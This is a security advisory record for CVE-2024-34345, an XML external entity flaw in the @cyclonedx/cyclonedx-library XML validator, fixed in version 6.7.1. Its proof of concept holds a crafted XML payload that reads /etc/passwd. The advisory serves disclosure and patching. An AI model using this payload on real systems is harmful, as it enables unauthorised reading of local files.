advisory_id: GHSA-38gf-rh2w-gmj7
datasource_id: github_osv_importer_v2/GHSA-38gf-rh2w-gmj7
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/05/GHSA-38gf-rh2w-gmj7/GHSA-38gf-rh2w-gmj7.json
aliases:
  - CVE-2024-34345
summary: |
  @cyclonedx/cyclonedx-library Improper Restriction of XML External Entity Reference vulnerability
  ### Impact

  XML External entity injections could be possible, when running the provided XML Validator on arbitrary input.

  #### POC

  ```js
  const {
    Spec: { Version },
    Validation: { XmlValidator }
  } = require('@cyclonedx/cyclonedx-library');

  const version = Version.v1dot5;
  const validator = new XmlValidator(version);
  const input = `<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE poc [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <bom xmlns="http://cyclonedx.org/schema/bom/1.5">
    <components>
      <component type="library">
        <name>testing</name>
        <version>1.337</version>
        <licenses>
          <license>
            <id>&xxe;</id><!-- << XML external entity (XXE) injection -->
          </license>
        </licenses>
      </component>
    </components>
  </bom>`;

  // validating this forged(^) input might lead to unintended behaviour
  // for the fact that the XML external entity would be taken into account.
  validator.validate(input).then(ve => {
    console.error('validation error', ve);
  });
  ```

  ### Patches

  This issue was fixed in `@cyclonedx/cyclonedx-library@6.7.1 `.



  ### Workarounds

  Do not run the provided XML validator on untrusted inputs.

  ### References

  * issue was introduced via <https://github.com/CycloneDX/cyclonedx-javascript-library/pull/1063>.
impacted_packages:
  - purl: pkg:npm/%40cyclonedx/cyclonedx-library
    affected_versions: vers:npm/6.7.0
    fixed_versions: vers:npm/6.7.1
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '8.1'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/05/GHSA-38gf-rh2w-gmj7/GHSA-38gf-rh2w-gmj7.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-611
references:
  - url: https://github.com/CycloneDX/cyclonedx-javascript-library
    reference_type:
    reference_id:
  - url: https://github.com/CycloneDX/cyclonedx-javascript-library/commit/5e5e1e0b9422f47d2de81c7c4064b803a01e7203
    reference_type:
    reference_id:
  - url: https://github.com/CycloneDX/cyclonedx-javascript-library/pull/1063
    reference_type:
    reference_id:
  - url: https://github.com/CycloneDX/cyclonedx-javascript-library/security/advisories/GHSA-38gf-rh2w-gmj7
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-34345
    reference_type:
    reference_id: CVE-2024-34345
